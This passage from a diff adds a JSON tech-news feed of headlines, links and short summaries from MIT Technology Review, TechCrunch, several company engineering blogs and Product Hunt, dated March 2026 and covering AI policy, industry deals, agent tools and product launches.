+      "link": "https://www.technologyreview.com/2026/03/18/1134345/advanced-nuclear-reactors-waste/",
+      "published": "Wed, 18 Mar 2026 09:00:00 +0000",
+      "source": "MIT Technology Review",
+      "summary": "MIT Technology Review Explains: Let our writers untangle the complex, messy world of technology to help you understand what’s coming next. You can read more from the series here. The way the world currently deals with nuclear waste is as creative as it is varied: Drown it in water pools, encase it in steel, bury&#8230;"
+    },
+    {
+      "title": "The Pentagon is planning for AI companies to train on classified data, defense official says",
+      "link": "https://www.technologyreview.com/2026/03/17/1134351/the-pentagon-is-planning-for-ai-companies-to-train-on-classified-data-defense-official-says/",
+      "published": "Tue, 17 Mar 2026 22:30:46 +0000",
+      "source": "MIT Technology Review",
+      "summary": "The Pentagon is discussing plans to set up secure environments for generative AI companies to train military-specific versions of their models on classified data, MIT Technology Review has learned.&#160; AI models like Anthropic’s Claude are already used to answer questions in classified settings; applications include analyzing targets in Iran. But allowing models to train on&#8230;"
+    },
+    {
+      "title": "The Download: OpenAI’s US military deal, and Grok’s CSAM lawsuit",
+      "link": "https://www.technologyreview.com/2026/03/17/1134322/the-download-openi-us-military-deal-grok-xai-csam-lawsuit/",
+      "published": "Tue, 17 Mar 2026 12:26:48 +0000",
+      "source": "MIT Technology Review",
+      "summary": "This is today&#8217;s edition of The Download, our weekday newsletter that provides a daily dose of what&#8217;s going on in the world of technology. Where OpenAI’s technology could show up in Iran&#160; OpenAI has controversially agreed to give the Pentagon access to its AI. But where exactly could its tech show up, and which applications&#8230;"
+    },
+    {
+      "title": "It’s been 20 years since the first tweet",
+      "link": "https://techcrunch.com/2026/03/21/its-been-20-years-since-the-first-tweet/",
+      "published": "Sat, 21 Mar 2026 20:30:47 +0000",
+      "source": "TechCrunch",
+      "summary": "On March 21, 2006, Jack Dorsey posted a simple message: “just setting up my twittr”."
+    },
+    {
+      "title": "Publisher pulls horror novel ‘Shy Girl’ over AI concerns",
+      "link": "https://techcrunch.com/2026/03/21/publisher-pulls-horror-novel-shy-girl-over-ai-concerns/",
+      "published": "Sat, 21 Mar 2026 19:30:27 +0000",
+      "source": "TechCrunch",
+      "summary": "Hachette Book Group said it will not be publishing “Shy Girl” over concerns that artificial intelligence was used to generate the text."
+    },
+    {
+      "title": "Delve accused of misleading customers with ‘fake compliance’",
+      "link": "https://techcrunch.com/2026/03/21/delve-accused-of-misleading-customers-with-fake-compliance/",
+      "published": "Sat, 21 Mar 2026 17:00:05 +0000",
+      "source": "TechCrunch",
+      "summary": "An anonymous Substack post accuses compliance startup Delve of “falsely” convincing “hundreds of customers they were compliant” with privacy and security regulations."
+    },
+    {
+      "title": "Why Wall Street wasn’t won over by Nvidia’s big conference",
+      "link": "https://techcrunch.com/2026/03/21/why-wall-street-wasnt-won-over-by-nvidias-big-conference/",
+      "published": "Sat, 21 Mar 2026 16:28:00 +0000",
+      "source": "TechCrunch",
+      "summary": "Despite investor fears of an AI bubble, Nvidia's latest conference shows that most in the industry aren't concerned by that possibility."
+    },
+    {
+      "title": "How fusion power works and the startups pursuing it",
+      "link": "https://techcrunch.com/2026/03/21/how-fusion-power-works-and-the-startups-pursuing-it/",
+      "published": "Sat, 21 Mar 2026 14:00:00 +0000",
+      "source": "TechCrunch",
+      "summary": "Fusion power promises to generate large amounts of clean electricity from nearly limitless fuel. This article explains the main approaches and the companies that use them."
+    },
+    {
+      "title": "New court filing reveals Pentagon told Anthropic the two sides were nearly aligned — a week after Trump declared the relationship kaput",
+      "link": "https://techcrunch.com/2026/03/20/new-court-filing-reveals-pentagon-told-anthropic-the-two-sides-were-nearly-aligned-a-week-after-trump-declared-the-relationship-kaput/",
+      "published": "Sat, 21 Mar 2026 01:40:28 +0000",
+      "source": "TechCrunch",
+      "summary": "Anthropic submitted two sworn declarations to a California federal court late Friday afternoon, pushing back on the Pentagon's assertion that the AI company poses an \"unacceptable risk to national security\" and arguing that the government's case relies on technical misunderstandings and claims that were never actually raised during the months of negotiations."
+    },
+    {
+      "title": "Elon Musk misled Twitter investors while trying to get out of acquisition, jury says",
+      "link": "https://techcrunch.com/2026/03/20/elon-musk-misled-twitter-investors-while-trying-to-get-out-of-acquisition-jury-says/",
+      "published": "Fri, 20 Mar 2026 23:29:17 +0000",
+      "source": "TechCrunch",
+      "summary": "At the time, Musk had tweeted that Twitter had too many bots, which is why he was trying to renege on his commitment to buy the company."
+    },
+    {
+      "title": "Microsoft rolls back some of its Copilot AI bloat on Windows",
+      "link": "https://techcrunch.com/2026/03/20/microsoft-rolls-back-some-of-its-copilot-ai-bloat-on-windows/",
+      "published": "Fri, 20 Mar 2026 20:53:09 +0000",
+      "source": "TechCrunch",
+      "summary": "The company is reducing Copilot entry points on Windows, starting with Photos, Widgets, Notepad, and other apps."
+    },
+    {
+      "title": "What happened at Nvidia GTC: NemoClaw, Robot Olaf, and a $1 trillion bet",
+      "link": "https://techcrunch.com/video/what-happened-at-nvidia-gtc-nemoclaw-robot-olaf-and-a-1-trillion-bet/",
+      "published": "Fri, 20 Mar 2026 20:02:35 +0000",
+      "source": "TechCrunch",
+      "summary": "CEO&#160;Jensen Huang took the stage at&#160;Nvidia&#8217;s GTC conference&#160;this week in his signature leather jacket to deliver a two-and-a-half-hour keynote, projecting&#160;$1 trillion&#160;in AI chip sales through 2027, declaring that every company needs an “OpenClaw strategy,” and closing with a rambling Olaf robot that had to get its mic cut. The message was hard to miss: Nvidia [&#8230;]"
+    },
+    {
+      "title": "Amid legal turmoil, Kalshi is temporarily banned in Nevada",
+      "link": "https://techcrunch.com/2026/03/20/amidst-legal-turmoil-kalshi-is-temporarily-banned-in-nevada/",
+      "published": "Fri, 20 Mar 2026 19:15:55 +0000",
+      "source": "TechCrunch",
+      "summary": "It's the latest escalation in a regulatory battle over the future of prediction markets."
+    },
+    {
+      "title": "Pinterest CEO calls on governments to ban social media for users under 16",
+      "link": "https://techcrunch.com/2026/03/20/pinterest-ceo-calls-on-governments-to-ban-social-media-for-users-under-16/",
+      "published": "Fri, 20 Mar 2026 19:01:54 +0000",
+      "source": "TechCrunch",
+      "summary": "Pinterest’s chief compares social media to tobacco and alcohol, saying children need similar protections."
+    },
+    {
+      "title": "Why scientists can’t get a laugh",
+      "link": "https://techcrunch.com/2026/03/20/why-scientists-cant-get-a-laugh/",
+      "published": "Fri, 20 Mar 2026 17:39:06 +0000",
+      "source": "TechCrunch",
+      "summary": "Humor is hard to pull off in front of a cold audience, full stop."
+    },
+    {
+      "title": "A French Navy officer accidentally leaked the location of an aircraft carrier by logging his run on Strava",
+      "link": "https://techcrunch.com/2026/03/20/a-french-navy-officer-accidentally-leaked-the-location-of-an-aircraft-carrier-by-logging-his-run-on-strava/",
+      "published": "Fri, 20 Mar 2026 17:21:18 +0000",
+      "source": "TechCrunch",
+      "summary": "A French naval officer went on a run around the deck of the Charles de Gaulle aircraft carrier, inadvertently leaking the warship's location when he uploaded the workout to Strava."
+    },
+    {
+      "title": "WordPress.com now lets AI agents write and publish posts, and more",
+      "link": "https://techcrunch.com/2026/03/20/wordpress-com-now-lets-ai-agents-write-and-publish-posts-and-more/",
+      "published": "Fri, 20 Mar 2026 16:43:09 +0000",
+      "source": "TechCrunch",
+      "summary": "New AI agents on WordPress.com could lower barriers to publishing while increasing machine-generated content across the web."
+    },
+    {
+      "title": "Jeff Bezos’ Blue Origin enters the space data center game",
+      "link": "https://techcrunch.com/2026/03/20/jeff-bezos-blue-origin-enters-the-space-data-center-game/",
+      "published": "Fri, 20 Mar 2026 16:27:43 +0000",
+      "source": "TechCrunch",
+      "summary": "\"Project Sunrise\" would include more than 50,000 satellites performing high-energy compute on orbit."
+    },
+    {
+      "title": "US accuses Iran’s government of operating hacktivist group that hacked Stryker",
+      "link": "https://techcrunch.com/2026/03/20/u-s-accuses-irans-government-of-operating-hacktivist-group-that-hacked-stryker/",
+      "published": "Fri, 20 Mar 2026 16:18:57 +0000",
+      "source": "TechCrunch",
+      "summary": "The U.S. Justice Department said an Iranian security ministry operates the fake activist persona known as Handala, which claimed responsibility for the destructive hack targeting medical tech giant Stryker."
+    },
+    {
+      "title": "Trump’s AI framework targets state laws, shifts child safety burden to parents",
+      "link": "https://techcrunch.com/2026/03/20/trumps-ai-framework-targets-state-laws-shifts-child-safety-burden-to-parents/",
+      "published": "Fri, 20 Mar 2026 16:14:04 +0000",
+      "source": "TechCrunch",
+      "summary": "Trump’s AI framework pushes federal preemption of state laws, emphasizes innovation, and shifts responsibility for child safety toward parents while laying out lighter-touch rules for tech companies."
+    },
+    {
+      "title": "AI startups are eating the venture industry and the returns, so far, are good",
+      "link": "https://techcrunch.com/2026/03/20/ai-startups-are-eating-the-venture-industry-and-the-returns-so-far-are-good/",
+      "published": "Fri, 20 Mar 2026 15:41:21 +0000",
+      "source": "TechCrunch",
+      "summary": "AI startups accounted for 41% of the $128 billion in venture dollars raised by companies on Carta last year — a record-high annual share."
+    },
+    {
+      "title": "Cyberattack on vehicle breathalyzer company leaves drivers stranded across the US",
+      "link": "https://techcrunch.com/2026/03/20/cyberattack-on-vehicle-breathalyzer-company-leaves-drivers-stranded-across-the-us/",
+      "published": "Fri, 20 Mar 2026 15:01:39 +0000",
+      "source": "TechCrunch",
+      "summary": "A cyberattack on a U.S. car breathalyzer company has left drivers across the United States reportedly stranded and unable to start their vehicles."
+    },
+    {
+      "title": "Amazon working on new smartphone with Alexa at its core, report says",
+      "link": "https://techcrunch.com/2026/03/20/amazon-working-on-new-smartphone-with-alexa-at-its-core-report-says/",
+      "published": "Fri, 20 Mar 2026 14:51:30 +0000",
+      "source": "TechCrunch",
+      "summary": "The device is being developed by the company's Devices and Services division, and it would feature personalized features aimed at making it easier to use Amazon's suite of apps, including Amazon shopping, Prime Video, and Prime Music, according to Reuters."
+    }
+  ],
+  "🏢 Big Tech Engineering": [
+    {
+      "title": "Rethinking open source mentorship in the AI era",
+      "link": "https://github.blog/open-source/maintainers/rethinking-open-source-mentorship-in-the-ai-era/",
+      "published": "Thu, 19 Mar 2026 18:00:00 +0000",
+      "source": "GitHub Blog",
+      "summary": "As contribution volume grows, mentorship signals are harder to read. The 3 Cs framework helps maintainers mentor more strategically... without burning out.\nThe post Rethinking open source mentorship in the AI era appeared first on The GitHub Blog."
+    },
+    {
+      "title": "How Squad runs coordinated AI agents inside your repository",
+      "link": "https://github.blog/ai-and-ml/github-copilot/how-squad-runs-coordinated-ai-agents-inside-your-repository/",
+      "published": "Thu, 19 Mar 2026 16:09:50 +0000",
+      "source": "GitHub Blog",
+      "summary": "An inside look at repository-native orchestration with GitHub Copilot and the design patterns behind multi-agent workflows that stay inspectable, predictable, and collaborative. \nThe post How Squad runs coordinated AI agents inside your repository appeared first on The GitHub Blog."
+    },
+    {
+      "title": "Investing in the people shaping open source and securing the future together",
+      "link": "https://github.blog/security/supply-chain-security/investing-in-the-people-shaping-open-source-and-securing-the-future-together/",
+      "published": "Tue, 17 Mar 2026 16:00:00 +0000",
+      "source": "GitHub Blog",
+      "summary": "See how GitHub is investing in open source security funding maintainers, partnering with Alpha-Omega, and expanding access to help reduce burden and strengthen software supply chains.\nThe post  Investing in the people shaping open source and securing the future together appeared first on The GitHub Blog."
+    },
+    {
+      "title": "GitHub for Beginners: Getting started with GitHub Actions",
+      "link": "https://github.blog/developer-skills/github/github-for-beginners-getting-started-with-github-actions/",
+      "published": "Mon, 16 Mar 2026 16:00:00 +0000",
+      "source": "GitHub Blog",
+      "summary": "Set up your first GitHub Actions workflow in this how-to guide.\nThe post GitHub for Beginners: Getting started with GitHub Actions appeared first on The GitHub Blog."
+    },
+    {
+      "title": "20 years in the AWS Cloud – how time flies!",
+      "link": "https://aws.amazon.com/blogs/aws/20-years-in-the-aws-cloud-how-time-flies/",
+      "published": "Thu, 19 Mar 2026 13:35:54 +0000",
+      "source": "AWS Blog",
+      "summary": "Celebrating twenty years of innovation in ML and AI technology at AWS. Countless developers—myself included—have embraced cloud computing and actively used its capabilities to accomplish what was previously impossible."
+    },
+    {
+      "title": "Our First 2026 AWS Heroes Cohort Is Here!",
+      "link": "https://aws.amazon.com/blogs/aws/our-first-2026-heroes-cohort-is-here/",
+      "published": "Wed, 18 Mar 2026 16:26:15 +0000",
+      "source": "AWS Blog",
+      "summary": "We’re thrilled to celebrate three exceptional developer community leaders as AWS Heroes. These individuals represent the heart of what makes the AWS community so vibrant. In addition to sharing technical knowledge, they build connections, forge genuine human relationships, and create pathways for others to grow. From pioneering cloud culture in mountain villages to leading cybersecurity […]"
+    },
+    {
+      "title": "AWS Weekly Roundup: Amazon S3 turns 20, Amazon Route 53 Global Resolver general availability, and more (March 16, 2026)",
+      "link": "https://aws.amazon.com/blogs/aws/aws-weekly-roundup-amazon-s3-turns-20-amazon-route-53-global-resolver-general-availability-and-more-march-16-2026/",
+      "published": "Mon, 16 Mar 2026 16:02:17 +0000",
+      "source": "AWS Blog",
+      "summary": "Twenty years ago this past week, Amazon S3 launched publicly on March 14, 2006. While Amazon Simple Storage Service is often considered the foundational storage service that defined cloud infrastructure, what began as a simple object storage service has grown into something far larger in scope and scale. As of March 2026, S3 stores more […]"
+    },
+    {
+      "title": "Three of the biggest fraud trends from MRC Vegas 2026",
+      "link": "https://stripe.com/blog/three-fraud-trends-from-mrc-vegas-2026",
+      "published": "Fri, 20 Mar 2026 00:00:00 +0000",
+      "source": "Stripe Blog",
+      "summary": "The most sophisticated fraud teams are shifting from one-size-fits-all fraud approaches to more dynamic, tailored interventions. They are removing friction for trusted users, embedding fraud detection directly into agentic transactions, and investing in multilayered identity verification to combat deepfakes."
+    },
+    {
+      "title": "Testing the impact of Adaptive Pricing across 1.5M subscription checkout sessions",
+      "link": "https://stripe.com/blog/adaptive-pricing-for-subscriptions",
+      "published": "Thu, 19 Mar 2026 00:00:00 +0000",
+      "source": "Stripe Blog",
+      "summary": "Adaptive Pricing is now available for subscriptions, allowing businesses to automatically localize prices in 150+ countries while Stripe handles currency conversion. In an A/B test across 1.5 million subscription checkouts, businesses saw 4.7% higher conversion and 5.4% higher LTV per session, on average."
+    },
+    {
+      "title": "Introducing the Machine Payments Protocol",
+      "link": "https://stripe.com/blog/machine-payments-protocol",
+      "published": "Wed, 18 Mar 2026 00:00:00 +0000",
+      "source": "Stripe Blog",
+      "summary": "We’re launching the Machine Payments Protocol (MPP), an open standard, internet-native way for agents to pay—co-authored by Tempo and Stripe. Businesses on Stripe can accept payments over MPP in a few lines of code using our PaymentIntents API."
+    },
+    {
+      "title": "Friend Bubbles: Enhancing Social Discovery on Facebook Reels",
+      "link": "https://engineering.fb.com/2026/03/18/ml-applications/friend-bubbles-enhancing-social-discovery-on-facebook-reels/",
+      "published": "Wed, 18 Mar 2026 18:19:33 +0000",
+      "source": "Meta Engineering",
+      "summary": "Friend bubbles in Facebook Reels highlight Reels your friends have liked or reacted to, helping you discover new content and making it easier to connect over shared interests. This article explains the technical architecture behind friend bubbles, including how machine learning estimates relationship strength and ranks content your friends have interacted with to create more [...]\nRead More...\nThe post Friend Bubbles: Enhancing Social Discovery on Facebook Reels appeared first on Engineering at "
+    },
+    {
+      "title": "Ranking Engineer Agent (REA): The Autonomous AI Agent Accelerating Meta’s Ads Ranking Innovation",
+      "link": "https://engineering.fb.com/2026/03/17/developer-tools/ranking-engineer-agent-rea-autonomous-ai-system-accelerating-meta-ads-ranking-innovation/",
+      "published": "Tue, 17 Mar 2026 20:07:52 +0000",
+      "source": "Meta Engineering",
+      "summary": "Meta’s Ranking Engineer Agent (REA) autonomously executes key steps across the end-to-end machine learning (ML) lifecycle for ads ranking models. This post covers REA’s ML experimentation capabilities: autonomously generating hypotheses, launching training jobs, debugging failures, and iterating on results. Future posts will cover additional REA capabilities. REA reduces the need for manual intervention. It manages [...]\nRead More...\nThe post Ranking Engineer Agent (REA): The Autonomous AI Agent"
+    },
+    {
+      "title": "Powering the agents: Workers AI now runs large models, starting with Kimi K2.5",
+      "link": "https://blog.cloudflare.com/workers-ai-large-models/",
+      "published": "Thu, 19 Mar 2026 19:53:16 GMT",
+      "source": "Cloudflare Blog",
+      "summary": "Kimi K2.5 is now on Workers AI, helping you power agents entirely on Cloudflare’s Developer Platform. Learn how we optimized our inference stack and reduced inference costs for internal agent use cases."
+    },
+    {
+      "title": "Introducing Custom Regions for precision data control",
+      "link": "https://blog.cloudflare.com/custom-regions/",
+      "published": "Wed, 18 Mar 2026 13:00:00 GMT",
+      "source": "Cloudflare Blog",
+      "summary": "We are expanding Regional Services with new pre-defined regions and the launch of Custom Regions. Customers can now define precise geographical boundaries for data processing, tailored to meet their compliance and performance needs."
+    },
+    {
+      "title": "Standing up for the open Internet: why we appealed Italy’s \"Piracy Shield\" fine",
+      "link": "https://blog.cloudflare.com/standing-up-for-the-open-internet/",
+      "published": "Mon, 16 Mar 2026 19:00:00 GMT",
+      "source": "Cloudflare Blog",
+      "summary": "Cloudflare is appealing a €14 million fine from Italian regulators over \"Piracy Shield,\" a system that forces providers to block content without oversight. We are challenging this framework to protect the Internet from disproportionate overblocking and lack of due process."
+    },
+    {
+      "title": "Build knowledge agents without embeddings",
+      "link": "https://vercel.com/blog/build-knowledge-agents-without-embeddings",
+      "published": "null",
+      "source": "Vercel Blog",
+      "summary": "Most knowledge agents start the same way. You pick a vector database, then build a chunking pipeline. You choose an embedding model, then tune retrieval parameters.Weeks later, your agent answers a question incorrectly, and you have no idea which chunk it retrieved or why that chunk scored highest.We kept seeing this pattern internally and for teams building agents on Vercel. The embedding stack works for semantic similarity, but it falls short when you need a specific value from structured data"
+    },
+    {
+      "title": "Two startups at global scale without DevOps",
+      "link": "https://vercel.com/blog/two-startups-at-global-scale-without-devops",
+      "published": "null",
+      "source": "Vercel Blog",
+      "summary": "Leonardo.AI processes more than 4.5 million images every day across cities worldwide, and Relevance AI's agents run autonomously across time zones, touching Salesforce, HubSpot, Slack, and dozens of other systems without pause. Neither company has a dedicated DevOps team.That's not an oversight. It's an operational model.The startup ecosystem in APAC is a clear example of why this model is taking hold. AI-native startups are surging across the region: over 1,000 are building in Australia alone, "
+    },
+    {
+      "title": "Chat SDK brings agents to your users",
+      "link": "https://vercel.com/blog/chat-sdk-brings-agents-to-your-users",
+      "published": "null",
+      "source": "Vercel Blog",
+      "summary": "In early January, we gave the entire company a challenge: figure out how to multiply your output.People created agents. Mostly chat bots, but dedicated ones, purpose-built for real workflow augmentation: the agents were doing things automatically that would otherwise be tedious and time consuming.Initially people built individual interfaces for their agents, and AI SDK made that easy with out-of-the box model integrations and AI Elements to simplify UI design.Then we hit a constraint. People wan"
+    },
+    {
+      "title": "360 billion tokens, 3 million customers, 6 engineers",
+      "link": "https://vercel.com/blog/360-billion-tokens-3-million-customers-6-engineers",
+      "published": "null",
+      "source": "Vercel Blog",
+      "summary": "Impact at a glanceDurable ships new production agents to customers in a single dayAI features and agents serve ~1.1B tokens per day (360B per year)10x leverage for every engineer, product manager, and designer3-4x lower infra cost compared to self hostingDurable began with a simple goal: make owning a business easier than having a job.60% of U.S. adults say they want to be their own boss, but only about 4% actually do it. Durable’s bet is that the blocker isn’t ambition. It’s friction. “Small bu"
+    },
+    {
+      "title": "Vercel Open Source Program: Winter 2026 cohort",
+      "link": "https://vercel.com/blog/vercel-open-source-program-winter-2026-cohort",
+      "published": "2026-03-17T13:00:00.000Z",
+      "source": "Vercel Blog",
+      "summary": "In April, we launched the Vercel Open Source Program to give maintainers the resources, credits, and support they need to ship faster and scale confidently. The first group joined through our spring 2025 cohort.Today we are welcoming the winter 2026 cohort. From AI-native apps and developer infrastructure to design systems and creative tooling, open source builders continue to amaze us. Meet the creators and explore their projects. Winter 2026 CohortAnswer Overflow Answer Overflow is an open sou"
+    },
+    {
+      "title": "Meet the 2026 Vercel AI Accelerator Cohort",
+      "link": "https://vercel.com/blog/2026-vercel-ai-accelerator-cohort",
+      "published": "null",
+      "source": "Vercel Blog",
+      "summary": "The Vercel AI Accelerator is back, and this year we selected 39 early-stage teams from across the US, Europe, Asia, and Latin America to build with us for six weeks.The next generation of AI startups is building on our self-driving infrastructure, and the accelerator is how we work directly with the earliest-stage founders among them. This year’s cohort spans every industry, at varying points in their journey, but they share a clear point of view on what needs to exist right now and the urgency "
+    }
+  ],
+  "🔥 Product Hunt": [
+    {
+      "title": "Contral",
+      "link": "https://www.producthunt.com/products/contral",
+      "published": "2026-03-20T13:40:44-07:00",
+      "source": "Product Hunt",
+      "summary": "The agentic IDE which teaches while you build.\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "optimo",
+      "link": "https://www.producthunt.com/products/optimo",
+      "published": "2026-03-20T01:33:14-07:00",
+      "source": "Product Hunt",
+      "summary": "effortless media optimizer for the web\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Cursor Glass",
+      "link": "https://www.producthunt.com/products/glass-4",
+      "published": "2026-03-20T07:14:15-07:00",
+      "source": "Product Hunt",
+      "summary": "Unified agent workspace with seamless cloud handoff power\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Sanota",
+      "link": "https://www.producthunt.com/products/sanota",
+      "published": "2026-03-18T06:42:25-07:00",
+      "source": "Product Hunt",
+      "summary": "Stories, beautifully crafted\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Replit Agent 4",
+      "link": "https://www.producthunt.com/products/replit-agent-4",
+      "published": "2026-03-19T10:12:23-07:00",
+      "source": "Product Hunt",
+      "summary": "Build design, and ship anything AI fast in one flow\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "murmur",
+      "link": "https://www.producthunt.com/products/murmur-7",
+      "published": "2026-03-16T22:03:11-07:00",
+      "source": "Product Hunt",
+      "summary": "practice tough phone calls with AI before you make them\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Everest AI",
+      "link": "https://www.producthunt.com/products/everest-ai",
+      "published": "2026-03-20T06:06:08-07:00",
+      "source": "Product Hunt",
+      "summary": "Building the world’s fastest IPMI single board computer\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Caplo",
+      "link": "https://www.producthunt.com/products/caplo",
+      "published": "2026-03-20T01:17:00-07:00",
+      "source": "Product Hunt",
+      "summary": "Real-time AI captions & translation for any iOS app\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Educato App",
+      "link": "https://www.producthunt.com/products/educato-app",
+      "published": "2026-03-20T08:20:25-07:00",
+      "source": "Product Hunt",
+      "summary": "Personalized exam prep, now in your pocket\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Claude Cowork Projects",
+      "link": "https://www.producthunt.com/products/claude-cowork-projects",
+      "published": "2026-03-20T09:23:41-07:00",
+      "source": "Product Hunt",
+      "summary": "Tasks, context, and files organized in one workspace\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Vite+",
+      "link": "https://www.producthunt.com/products/vite-alpha",
+      "published": "2026-03-17T07:49:18-07:00",
+      "source": "Product Hunt",
+      "summary": "The Unified Toolchain for the Web\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "AI Skills Manager",
+      "link": "https://www.producthunt.com/products/ai-skills-manager",
+      "published": "2026-03-19T06:22:37-07:00",
+      "source": "Product Hunt",
+      "summary": "One place for all your AI skills\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "ProductBridge",
+      "link": "https://www.producthunt.com/products/productbridge",
+      "published": "2026-03-18T05:42:01-07:00",
+      "source": "Product Hunt",
+      "summary": "Agent that collects feedback across multiple platforms\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "GitAgent by Lyzr",
+      "link": "https://www.producthunt.com/products/gitagent-2",
+      "published": "2026-03-19T23:11:20-07:00",
+      "source": "Product Hunt",
+      "summary": "Your repository becomes your agent\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Kickfolder",
+      "link": "https://www.producthunt.com/products/kickfolder",
+      "published": "2026-03-19T01:03:13-07:00",
+      "source": "Product Hunt",
+      "summary": "Turn your Mac's top edge into a hidden command center\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Google AI Studio 2.0",
+      "link": "https://www.producthunt.com/products/google-ai-studio-8",
+      "published": "2026-03-19T08:59:33-07:00",
+      "source": "Product Hunt",
+      "summary": "Full-stack vibe coding powered by Antigravity + Firebase\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Joy for Gmail",
+      "link": "https://www.producthunt.com/products/joy-for-gmail",
+      "published": "2026-03-19T06:09:37-07:00",
+      "source": "Product Hunt",
+      "summary": "A Gmail with clearer inbox, focused writing, less noise \n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Chat",
+      "link": "https://www.producthunt.com/products/chat-5",
+      "published": "2026-03-19T17:15:04-07:00",
+      "source": "Product Hunt",
+      "summary": "turn your backend into a chat app instantly\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Gaze Guard",
+      "link": "https://www.producthunt.com/products/gaze-guard",
+      "published": "2026-03-19T14:59:19-07:00",
+      "source": "Product Hunt",
+      "summary": "Instant Privacy & Screen Blur\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "MusicLib",
+      "link": "https://www.producthunt.com/products/musiclib",
+      "published": "2026-03-19T13:17:53-07:00",
+      "source": "Product Hunt",
+      "summary": "The Ultimate Sheet Music Library Solution\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Cacheless",
+      "link": "https://www.producthunt.com/products/cacheless-ai-powered-disk-cleanup",
+      "published": "2026-03-18T22:28:53-07:00",
+      "source": "Product Hunt",
+      "summary": "AI-Powered Mac System Data Cleaner\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Composer 2 by Cursor",
+      "link": "https://www.producthunt.com/products/cursor",
+      "published": "2026-03-19T09:26:55-07:00",
+      "source": "Product Hunt",
+      "summary": "Fast, token-efficient frontier-level coding model\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Context Overflow",
+      "link": "https://www.producthunt.com/products/context-overflow",
+      "published": "2026-03-19T19:07:57-07:00",
+      "source": "Product Hunt",
+      "summary": "Knowledge Sharing for AI Agents\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Claude Code Channels",
+      "link": "https://www.producthunt.com/products/claude",
+      "published": "2026-03-19T21:35:29-07:00",
+      "source": "Product Hunt",
+      "summary": "Push events and chat with Claude Code via Telegram & Discord\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Telea",
+      "link": "https://www.producthunt.com/products/telea",
+      "published": "2026-03-19T18:03:05-07:00",
+      "source": "Product Hunt",
+      "summary": "Speak like you always know what to say\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "AdsTurbo",
+      "link": "https://www.producthunt.com/products/adsturbo-2",
+      "published": "2026-03-17T00:31:34-07:00",
+      "source": "Product Hunt",
+      "summary": "Create ads with AI actors that look truly human\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Room Service",
+      "link": "https://www.producthunt.com/products/room-service-2",
+      "published": "2026-03-19T14:57:07-07:00",
+      "source": "Product Hunt",
+      "summary": "The Mac cleaner built for developers\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Visdiff",
+      "link": "https://www.producthunt.com/products/visdiff",
+      "published": "2026-03-18T21:27:57-07:00",
+      "source": "Product Hunt",
+      "summary": "Stop bridging the design-to-code gap, close it\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Looq: Preview Files",
+      "link": "https://www.producthunt.com/products/looq-3",
+      "published": "2026-03-19T13:58:29-07:00",
+      "source": "Product Hunt",
+      "summary": "A better Quick Look: code, Markdown, Mermaid, SQLite & more\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Gately",
+      "link": "https://www.producthunt.com/products/nevacode",
+      "published": "2026-03-17T19:58:49-07:00",
+      "source": "Product Hunt",
+      "summary": "Everything you need to build your own membership\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Link AI",
+      "link": "https://www.producthunt.com/products/link-ai",
+      "published": "2026-03-18T17:55:24-07:00",
+      "source": "Product Hunt",
+      "summary": "The Agentic Business Suite that replaces your entire stack\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Okan",
+      "link": "https://www.producthunt.com/products/okan-claude-code-browser-notifications",
+      "published": "2026-03-18T18:50:45-07:00",
+      "source": "Product Hunt",
+      "summary": "One click accept/reject notifications for Claude Code\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "PixelClaw",
+      "link": "https://www.producthunt.com/products/pixelclaw",
+      "published": "2026-03-18T10:47:20-07:00",
+      "source": "Product Hunt",
+      "summary": "A tiny pixel crab that lives on your Dock\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Budibase AI Agents",
+      "link": "https://www.producthunt.com/products/budibase",
+      "published": "2026-03-18T07:58:30-07:00",
+      "source": "Product Hunt",
+      "summary": "AI agents that run your operations (Open source)\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "MiniMax-M2.7",
+      "link": "https://www.producthunt.com/products/minimax-agent",
+      "published": "2026-03-18T05:52:17-07:00",
+      "source": "Product Hunt",
+      "summary": "Self-evolving AI model powering autonomous agents\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "Stitch 2.0 by Google",
+      "link": "https://www.producthunt.com/products/stitch-2-0-by-google-2",
+      "published": "2026-03-18T11:36:27-07:00",
+      "source": "Product Hunt",
+      "summary": "Vibe design beautiful production-ready UI in seconds\n          \n          \n            Discussion\n            |\n            Link"
+    },
